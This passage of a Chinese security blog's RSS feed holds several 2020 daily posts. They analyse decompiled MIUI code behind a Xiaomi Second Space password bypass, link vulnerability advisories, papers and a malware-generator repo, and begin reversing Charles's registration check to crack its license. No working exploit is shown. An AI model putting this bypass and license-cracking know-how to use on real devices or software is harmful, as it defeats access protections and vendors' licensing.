&lt;p&gt;这个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;if&lt;/code&gt;块的第一句代码就是调用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;switchUser()&lt;/code&gt;，一共有三个判断&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public int switchUser(int mTargetUserId) {
    if(DeviceUtil.isPhoneCalling(this.mContext)) {
        Log.d(&quot;SpaceManagerWrapper&quot;, &quot;Can\'t switch user to &quot; + mTargetUserId + &quot; when calling.&quot;);
        return 2;
    }

    if(MiuiSettings$Secure.isGreenKidActive(this.mContext.getContentResolver())) {
        Log.d(&quot;SpaceManagerWrapper&quot;, &quot;Can\'t switch user to &quot; + mTargetUserId + &quot; when green kid active.&quot;);
        return 3;
    }

    if(MiuiSettings$System.isSuperSaveModeOpen(this.mContext, 0)) {
        Log.d(&quot;SpaceManagerWrapper&quot;, &quot;Can\'t switch user to &quot; + mTargetUserId + &quot; when super power active.&quot;);
        return 4;
    }

    if(this.mSpaceManager.switchUser(mTargetUserId)) {
        return 0;
    }

    return 1;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;第一个判断，如果当前有电话打进来或者正在接电话，不进行Space切换&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CALL_STATE_STATE_IDLE = 0;
CALL_STATE_STATE_RUNNING = 1;
CALL_STATE_STATE_OFFHOOK = 2;

public static boolean isPhoneCalling(Context context) {
    boolean result = true;
    int callState = context.getSystemService(&quot;phone&quot;).getCallState();
    if(callState != 1 &amp;amp;&amp;amp; callState != 2) {
        result = false;
    }

    return result;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;第二个判断和第三个判断，有一点点棘手，因为它调用到了Framework代码，小米在这一层多了相当多的定制&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import android.provider.MiuiSettings$Secure;
import android.provider.MiuiSettings$System;

if(MiuiSettings$Secure.isGreenKidActive(this.mContext.getContentResolver())) {
    Log.d(&quot;SpaceManagerWrapper&quot;, &quot;Can\'t switch user to &quot; + mTargetUserId + &quot; when green kid active.&quot;);
    return 3;
}

if(MiuiSettings$System.isSuperSaveModeOpen(this.mContext, 0)) {
    Log.d(&quot;SpaceManagerWrapper&quot;, &quot;Can\'t switch user to &quot; + mTargetUserId + &quot; when super power active.&quot;);
    return 4;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;解析boot-framework.vdex，会获得三个cdex，再解析三个cdex文件为dex文件即可&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/C6FE99F25A99F5D480D2D8DF6827060C.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;JEB分析一波，可以直接找到两个方法，正常情况下这两个方法都返回&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;false&lt;/code&gt;，可以不用过多关注&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/6D15B242DBB968006CBF5027ACFA08A1.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;最后就是切换Space啦&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if(this.mSpaceManager.switchUser(mTargetUserId)) {
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这后面又会调用到Framework的代码，咱们就不进行展开了&lt;/p&gt;

&lt;p&gt;有生之年一定要认识一下F-Secure的大佬们，给大佬们一人带一双温州皮鞋穿穿&lt;/p&gt;
</description>
                <pubDate>Wed, 10 Jun 2020 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/android_application_security/2020/06/10/REDMI-5-Plus-Second-Space-Password-Bypass.html</link>
                <guid isPermaLink="true">http://localhost:4000/android_application_security/2020/06/10/REDMI-5-Plus-Second-Space-Password-Bypass.html</guid>
            </item>
        
            <item>
                <title>大土豆安全笔记 2020.06.09 填上了小米Second Space密码绕过的坑</title>
                <description>&lt;p&gt;萌新小UP又来了，第四弹，听说有人想让我发语音解说版本的，那咱们安排一下？&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.bilibili.com/video/BV1M5411W7LP&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;今天买了一本书，叫作《Android应用安全测试与防护》&lt;/p&gt;

&lt;p&gt;我也想被大佬友情赠送一本啊，可是我这么菜，只能自己买&lt;/p&gt;

&lt;p&gt;人与人的差距一下就体现出来了&lt;/p&gt;

&lt;p&gt;大佬们出书都是签名互赠，然后朋友圈拜读PR一波，其乐融融，而我只能默默蹭大佬新书的热点&lt;/p&gt;

&lt;p&gt;无论是早年间的逆向破解，还是现在的业务安全，在技术面前，我都还是个小学生&lt;/p&gt;

&lt;p&gt;今天研究了SwiftUI，这玩意真的好用，我之前说过我写的一个大土豆逆向助手，基于JavaFX，界面很丑，我又不想花时间优化界面，然后也有一些奇奇怪怪的Bug，所以我决定移植到macOS&lt;/p&gt;

&lt;p&gt;现在的JEB实在是太笨重了&lt;/p&gt;

&lt;p&gt;今天把前几天挖的坑填了，就是小米那个Second Space密码绕过，完整的分析明后天发&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/A40B67888D0A9F50B20887A23A0C4E76.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;因为这个坑的原因我研究了一波Framework层，小米在这里做了相当多的定制&lt;/p&gt;

&lt;p&gt;小米开源了系统内核源码，但是没有开源Framework，原因大家可以自己去猜想&lt;/p&gt;

&lt;p&gt;在Android P及以上，系统使用的是vdex格式，然后vdex解析出来是cdex，cdex解析出来才是dex文件&lt;/p&gt;

&lt;p&gt;这一点我确实没想到，因为我几乎没怎么接触过Framework，这也暴露了我的知识盲区，抓紧时间学习&lt;/p&gt;

&lt;p&gt;所以今天下午一直在踩坑，好在最后还是完成了，MIUI这部分的处理我会单独写一篇文章去分享，包括如何反编译MIUI固件包去获取系统文件等等&lt;/p&gt;

&lt;p&gt;我在业余时间也挖掘了一些类似攻击面的漏洞，希望有机会可以跟大家分享我的一些想法和自实现的逻辑漏洞挖掘工具&lt;/p&gt;

&lt;p&gt;F-Secure实验室是我最喜欢的安全团队没有之一&lt;/p&gt;

&lt;p&gt;在我工作之后，一直都会有安全团队想让我加入，无论是活跃在互联网上的民间安全团队，还是公司内部的官方安全团队，我无一例外的都拒绝了&lt;/p&gt;

&lt;p&gt;如果邀请我的是F-Secure，我想我绝对不会拒绝&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/4FAAD2C531741B9DE8CFEF07EA56D030.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;梦想还是要有的，一不小心就实现了呢:)&lt;/p&gt;

&lt;p&gt;我发现了一个很好玩的游戏，国内叫作《冬日计划》&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/176A7791894575503756A37158D18802.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;游戏背景为八个在雪地遇难的玩家，有各自的身份，其中有背叛者和小偷，剩下的是无辜者，无辜者需要收集材料修复，比如电路板，油这些，背叛者的任务是阻挠无辜者逃生，小偷可以偷身份切换阵营&lt;/p&gt;

&lt;p&gt;让我蛋疼的地方在于，这个游戏只支持Windows平台&lt;/p&gt;

&lt;p&gt;所以，我又有理由买台新电脑啦！&lt;/p&gt;

&lt;p&gt;TO TRUST NO ONE, HAVE FUN&lt;/p&gt;

&lt;p&gt;好啦，各位老板到钟了&lt;/p&gt;

&lt;p&gt;Duang~Duang~Duang~&lt;/p&gt;
</description>
                <pubDate>Tue, 09 Jun 2020 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/security_daily/2020/06/09/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.06.09.html</link>
                <guid isPermaLink="true">http://localhost:4000/security_daily/2020/06/09/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.06.09.html</guid>
            </item>
        
            <item>
                <title>大土豆安全笔记 2020.06.08 知识焦虑真的学的更快</title>
                <description>&lt;p&gt;原来没有高考的这两天是如此的平常&lt;/p&gt;

&lt;p&gt;B站小UP又来啦，请无视沙雕的音乐，谁还没有杀马特的一青葱岁月呢&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.bilibili.com/video/BV1bD4y1D779&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;TSRC面向国外悬赏了一波，我没找到中文的版本，不知道是什么意思&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/4DC99E0A8C494A757CAEF95CBFA9B880.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;有兴趣的二进制大佬们可以去整一波了&lt;/p&gt;

&lt;p&gt;TencentOS Server&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/Tencent/TencentOS-kernel
TencentOS tiny&lt;/li&gt;
  &lt;li&gt;https://github.com/Tencent/TencentOS-tiny&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;不知道提交漏洞的时候要不要伪装一下老外&lt;/p&gt;

&lt;p&gt;泉哥的这篇文章我挺有感触&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://mp.weixin.qq.com/s/gBgFyy4MMrF5vn-8NGEVQw&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我也是一个极其焦虑的人，曾经有一段时间我的知识密度极其恐怖，就是拼命看拼命看拼命看，上下班路上看，吃饭的时候看，睡觉前看&lt;/p&gt;

&lt;p&gt;我知道技术光看肯定是看不会的，所以我对我收集的资料做了分类&lt;/p&gt;

&lt;p&gt;简单来说就是前置知识与正式知识&lt;/p&gt;

&lt;p&gt;前置知识属于我可以不动手，纯阅读理解，比如各种概念解释的文章，像Android系统各种源码分析文章，我只需要跟着作者的思路去理解即可&lt;/p&gt;

&lt;p&gt;正式知识就是那种需要我静下心来，仔仔细细去动手写代码，去调试的内容&lt;/p&gt;

&lt;p&gt;而更好的一种模式，就是前置知识是正式知识的铺垫，这样在调试漏洞的时候就会顺手很多，不会有很多概念不理解&lt;/p&gt;

&lt;p&gt;前几天搬了工位，整理了很多我打印出来阅读的文章&lt;/p&gt;

&lt;p&gt;时间过得真快，我还记得那会儿大家都下班了，然后我一个人蹲在打印机边上，看着几十张的纸在打印，打印完再装订，回家路上就可以看个热乎的文章了&lt;/p&gt;

&lt;p&gt;那段时间的经历，说真的，我知识面扩充的特别快，以至于我现在成功晋级为嘴强王者&lt;/p&gt;

&lt;p&gt;现在当然就好很多了，我会去挑一些喜欢的知识学习，顺着文章的思路去思考别人是如何思考的&lt;/p&gt;

&lt;p&gt;比如今年HITB，害，没有想看的&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://conference.hitb.org/lockdown-livestream/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我今天看到一个APK病毒生成器更新了&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/thelinuxchoice/getdroid&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;不想被上传VT还想着恰饭，啊呸！&lt;/p&gt;

&lt;p&gt;啪啪啪啪啪啪，打你&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/0EED5C83AFCEAF459856190A8B1990C7.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我们都是社会主义小兄弟，规则直接安排上&lt;/p&gt;

&lt;p&gt;最近在学习摄影以及后期相关的知识，想制作一些Vlog，还是B站，如果你看到了，欢迎三连投币哦&lt;/p&gt;

&lt;p&gt;好啦，各位老板到钟了&lt;/p&gt;

&lt;p&gt;Duang~Duang~Duang~&lt;/p&gt;
</description>
                <pubDate>Mon, 08 Jun 2020 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/security_daily/2020/06/08/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.06.08.html</link>
                <guid isPermaLink="true">http://localhost:4000/security_daily/2020/06/08/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.06.08.html</guid>
            </item>
        
            <item>
                <title>大土豆安全笔记 2020.06.05</title>
                <description>&lt;p&gt;真是让人难过，我想加入一些业务安全交流群，大佬们都觉得我在业界是个听都没听过的菜鸟，不带我玩&lt;/p&gt;

&lt;p&gt;暴风哭泣&lt;/p&gt;

&lt;p&gt;哭泣完继续努力学习&lt;/p&gt;

&lt;p&gt;安卓病毒分析分享更新了第二弹，内容积极阳光健康，请大佬们放心享用&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.bilibili.com/video/BV1xT4y1g7Aa&lt;/li&gt;
  &lt;li&gt;https://www.bilibili.com/video/BV1dV411C7WA&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Django对我这种菜鸟来说简直是福音！&lt;/p&gt;

&lt;p&gt;这个东西好用的很！&lt;/p&gt;

&lt;p&gt;我半年前关注的一个技术，Flutter，是一个必须掌握的技术了&lt;/p&gt;

&lt;p&gt;据我所知，字节跳动内部多个大业务线都已经落地了Flutter，包括今日头条，西瓜视频等&lt;/p&gt;

&lt;p&gt;提这个并非是我有开发Flutter应用的需要&lt;/p&gt;

&lt;p&gt;我之所以选择二进制安全方向一个决定性的原因就是我不喜欢写代码，所以我一直是一个嘴炮选手&lt;/p&gt;

&lt;p&gt;Always嘴强王者，哈哈哈哈哈哈哈哈哈哈&lt;/p&gt;

&lt;p&gt;回到正题，提这个是因为我相信在不久的将来，Flutter一定会成为大厂的标配技术栈，优秀的跨平台技术可以让业务线快速试错&lt;/p&gt;

&lt;p&gt;到时一定会出现大量的Flutter应用，这个时候移动安全团队在做竞品分析的时候就会遇到使用Flutter开发的应用&lt;/p&gt;

&lt;p&gt;到时候真的来不及&lt;/p&gt;

&lt;p&gt;从业务角度来说，学习Flutter开发应用，这是一件必做的事情&lt;/p&gt;

&lt;p&gt;从另一个角度来说，Flutter应用的安全性该如何保障？&lt;/p&gt;

&lt;p&gt;机会来了，赶紧做，说不定就可以参与《Flutter应用安全评定标准》的制定&lt;/p&gt;

&lt;p&gt;还有线上漏洞扫描器，做个漂亮的界面打包SaaS，卖服务给那些拥抱Flutter的大公司&lt;/p&gt;

&lt;p&gt;美滋滋呀~&lt;/p&gt;

&lt;p&gt;这里有一篇相关的文章，讲的是如何捕获来自Flutter应用的数据包&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://blog.nviso.eu/2019/08/13/intercepting-traffic-from-android-flutter-applications/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;昨天刚说的一直想写一个反汇编器，这就安排上了，Linux x86_64架构，有兴趣可以玩一下&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://metabytezero.blogspot.com/2019/08/writing-disassembler.html&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;推荐一篇来自友商的威胁情报推送&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://mp.weixin.qq.com/s/WKkRQhd8MgbcxwIvQMr17Q&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;友商这方面做得还是很专业的，值得学习&lt;/p&gt;

&lt;p&gt;Bitdefender团队发现一个在野四年的高度复杂的病毒，我有个好朋友专门收集这些样本，我明天找他要一份学习&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://labs.bitdefender.com/2020/05/mandrake-owning-android-devices-since-2016/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;最近都没看到有意思的安卓APT样本，有一些寂寞啊&lt;/p&gt;

&lt;p&gt;最近听朋友说了件有趣的故事&lt;/p&gt;

&lt;p&gt;朋友说这是他从微信群听来的&lt;/p&gt;

&lt;p&gt;说是有一个社招的小伙子，原先是一个小公司的工程师，因为公司发展问题导致所在部门解散，于是投了某千人量级互联网公司&lt;/p&gt;

&lt;p&gt;团队面试完之后感觉非常不错，基础知识扎实，但是欠缺了一点岗位相关经验，底层技术栈是符合的&lt;/p&gt;

&lt;p&gt;这家公司的社招是先面试，然后再走流程，所以走流程的时候已经全部面试完了&lt;/p&gt;

&lt;p&gt;在走流程的时候，团队在一面评价上给了一个公司内部大部分同龄人的职级X，不高不低，应该来说是匹配的&lt;/p&gt;

&lt;p&gt;在面试评价提交之后，页面跳转到面试管理界面，上面显示部门老板给的二面顶级比X小一级&lt;/p&gt;

&lt;p&gt;我也不知道这个团队看到老板的定级是什么心理活动，紧张？还是无所谓？&lt;/p&gt;

&lt;p&gt;估计是无所谓，因为提交完之后团队就去吃饭了&lt;/p&gt;

&lt;p&gt;吃饭的时候，团队收到了一封邮件，说是简历被HR修改&lt;/p&gt;

&lt;p&gt;打开邮件一看细节，团队在一面给候选人定的职级被人为降低了一个等级&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;这个故事如果发生在我身上，我会离开这个地方&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;好啦，各位老板到钟了&lt;/p&gt;

&lt;p&gt;Duang~Duang~Duang~&lt;/p&gt;
</description>
                <pubDate>Fri, 05 Jun 2020 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/security_daily/2020/06/05/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.06.05.html</link>
                <guid isPermaLink="true">http://localhost:4000/security_daily/2020/06/05/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.06.05.html</guid>
            </item>
        
            <item>
                <title>大土豆安全笔记 2020.06.04</title>
                <description>&lt;p&gt;有大佬可以教教我怎么运营技术公众号可以年入百万吗？&lt;/p&gt;

&lt;p&gt;昨天说的那个病毒分析分享，我已经传到B站让大家吊打了&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.bilibili.com/video/BV1sz4y197Gd&lt;/li&gt;
  &lt;li&gt;https://www.bilibili.com/video/BV1DV411r7Gw&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我今天在读腾讯SRC发的一篇关于Webshell检测的文章《主机安全—洋葱Webshell检测实践与思考》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://security.tencent.com/index.php/blog/msg/152&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;声明：我对Webshell相关的任何技术都不感兴趣，我只是好奇其它厂的技术研究思路，看看有没有可以借鉴的地方&lt;/p&gt;

&lt;p&gt;今年BlackHat龚师傅会有一个梯云纵漏洞利用链的分享，太强了！&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/A571C91D605DDC01C4855A7ACD81503B.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;其中用到的三个漏洞我列一下：&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;CVE-2019-5870：Chrome的Media组件UAF，这个漏洞可以用于Chrome的沙箱逃逸&lt;/li&gt;
  &lt;li&gt;CVE-2019-5877：Chrome的V8引擎OOB访问&lt;/li&gt;
  &lt;li&gt;CVE-2019-10567：这个漏洞可能就是谷歌当时认定的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;特别聪明&lt;/code&gt;，它可以欺骗GPU内核驱动达到覆写ringbuffer的目的，这个漏洞我没看懂&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;谷歌公告的描述如下&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/BACC551DE6B25417E485B97414F199B9.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;相当期待啊&lt;/p&gt;

&lt;p&gt;这两天想把我平时写的一些脚本SaaS化，这样直接访问一个Web界面就可以使用所有功能了，想想就美滋滋&lt;/p&gt;

&lt;p&gt;大部分代码都是Python，有一部分是Java，我目前准备使用Django框架，师傅们有其它建议嘛？&lt;/p&gt;

&lt;p&gt;明显感觉最近学习的速度慢下来了，我想了想，公众号一定要保持日更&lt;/p&gt;

&lt;p&gt;我这个人本来头脑本来就很一般，技术这种东西我学的其实特别慢，有时候一个很简单的技术点，我会思考很久才理解&lt;/p&gt;

&lt;p&gt;有可能是因为我思考的比较深入，嗯，就是这样&lt;/p&gt;

&lt;p&gt;这两天有一个小伙投了我们的社招，拿到简历我一看ID，我电脑里还有这小伙的一篇技术文章，哈哈哈哈哈哈哈哈哈哈&lt;/p&gt;
</description>
                <pubDate>Thu, 04 Jun 2020 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/security_daily/2020/06/04/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.06.04.html</link>
                <guid isPermaLink="true">http://localhost:4000/security_daily/2020/06/04/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.06.04.html</guid>
            </item>
        
            <item>
                <title>大土豆安全笔记 2020.06.03</title>
                <description>&lt;p&gt;很长很长很长时间没有写过安全笔记了，最近掉粉严重啊&lt;/p&gt;

&lt;p&gt;人在江湖，身不由己，这一个多月一直在做业务安全相关的事情&lt;/p&gt;

&lt;p&gt;年初说好的安全研究呢？&lt;/p&gt;

&lt;p&gt;2020 ISSTA的Accepted Papers&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://conf.researchr.org/track/issta-2020/issta-2020-papers#event-overview&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;里面有一篇Paper我很感兴趣，关于ARM反汇编器&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.muhui.site/files/issta20.pdf&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ARM架构的反汇编挺复杂的，因为涉及到Arm和Thumb两种指令集，后面又加入了Thumb2，如果区分不好极其造成错误的解析&lt;/p&gt;

&lt;p&gt;我一直想着写一个自己的解析器，主要是做定制分析程序逻辑，识别加解密算法，虚拟机，函数执行顺序等一系列好玩的事情&lt;/p&gt;

&lt;p&gt;之后再搞个酷炫的界面包装一下弄个产品去创业，然后把团队打包卖给大公司，我就可以搞下一个产品继续忽悠了，哈哈哈哈哈哈哈哈哈哈&lt;/p&gt;

&lt;p&gt;今年的MobiSys没啥感兴趣的东西&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.sigmobile.org/mobisys/2020/papers/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;崇拜的大佬们发了一个关于小米Second Space密码绕过的漏洞，我下载了对应时间的ROM，到时候分析一波发个详细文章&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://labs.f-secure.com/advisories/xiaomi-second-space&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我个人对小米手机还是挺喜欢的，但是小米的安全部门，呵呵&lt;/p&gt;

&lt;p&gt;泉哥推荐的用Inoreader来订阅最新的安全Paper，先搜索Title，按提交时间进行排序&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/B26D33961B2D20794FF3087BB8C41490.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;然后查询Inoreader&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/A31C1D4B5E44C7D7F9CA9B41170834DC.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Web feeds&lt;/code&gt;，稍微等待一会，生成结果&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/7285EC8485B6E1E9BC0EBB2A4BB4E231.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;于是我一咬牙，选择了每天手动瞅一眼最新的Paper吧&lt;/p&gt;

&lt;p&gt;自从我司上了光荣榜之后，知乎上面就集体开始出现一波秀智商的问题&lt;/p&gt;

&lt;p&gt;害，你让人说什么好&lt;/p&gt;

&lt;p&gt;卫士弹窗广告多这咱们不否认，但给你装2345浏览器这事，我觉得就是你自己的问题了&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/36F8993A263BAA36EE49B567BC1D9893.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;给各位师傅们讲件事，接下来公众号要开始批量投放一波我很久之前写的Android逆向入门教程，也会有一些“卖水”的付费文章，毕竟要恰饭，都是简单的东西，大佬们忽略即可&lt;/p&gt;
</description>
                <pubDate>Wed, 03 Jun 2020 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/security_daily/2020/06/03/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.06.03.html</link>
                <guid isPermaLink="true">http://localhost:4000/security_daily/2020/06/03/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.06.03.html</guid>
            </item>
        
            <item>
                <title>大土豆安全笔记 2020.05.09</title>
                <description>&lt;p&gt;老外说微信不仅监控国内聊天，还监控国外，这反射弧长的可绕地球三圈半，不知道该说什么好&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://citizenlab.ca/2020/05/we-chat-they-watch/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;直观点大概就是这个意思，里面这张图我给打码了，我不想随手转发个东西把自己搞进局子里&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/417AAF2332C9D6B65943FDE29EE332F3.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;移动安全这两天有意思的就是j00ru开源的Fuzzer，以及三星Qmage的RCE&lt;/p&gt;

&lt;p&gt;ssue 2002: Samsung Android multiple interactionless RCEs and other remote access issues in Qmage image codec built into Skia&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://bugs.chromium.org/p/project-zero/issues/detail?id=2002&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;开源的Fuzzer如下&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/googleprojectzero/SkCodecFuzzer&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;演示视频，相信大家都有梯子了&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.youtube.com/watch?v=nke8Z3G4jnc&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/845F7401FEE0A1BBD69F1F20E5FEC787.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;希望这个工具好用，哈哈哈哈哈哈哈哈哈哈&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/FB3BA0AB6179AA05A187B8EE2D6A116B.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;天天在我这说又有认识的大佬离职不太好，祝大佬们前程似锦！&lt;/p&gt;

&lt;p&gt;最后发个招聘&lt;/p&gt;

&lt;p&gt;移动安全，安卓应用审核方向，大概要求大家也都知道，我就不过多描述了，万一写的不好被人指出来我多尴尬&lt;/p&gt;

&lt;p&gt;有兴趣简历发我邮箱：wnagzihxa1n@gmail.com&lt;/p&gt;
</description>
                <pubDate>Sat, 09 May 2020 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/security_daily/2020/05/09/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.05.09.html</link>
                <guid isPermaLink="true">http://localhost:4000/security_daily/2020/05/09/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.05.09.html</guid>
            </item>
        
            <item>
                <title>大土豆安全笔记 2020.05.08</title>
                <description>&lt;p&gt;整了一波Charles&lt;/p&gt;

&lt;p&gt;注册界面一个是用户名，一个是注册码&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/FAA4595F3CB659F16812B7297C5F7926.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;全局搜索字符串，这若无其事的混淆真是让人不知所措&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/665804C886F7BE98DDB440E46A837BAE.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;作个注释&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public class RegisterFrame extends JDialog {
    private final JTextField tName; // 用户名
    private final JTextField tSerial; // 序列号
  
    private final JButton bRegister; // 注册按钮
    private final JButton bCancel; // 取消按钮
  
    public RegisterFrame(Frame paramFrame) {
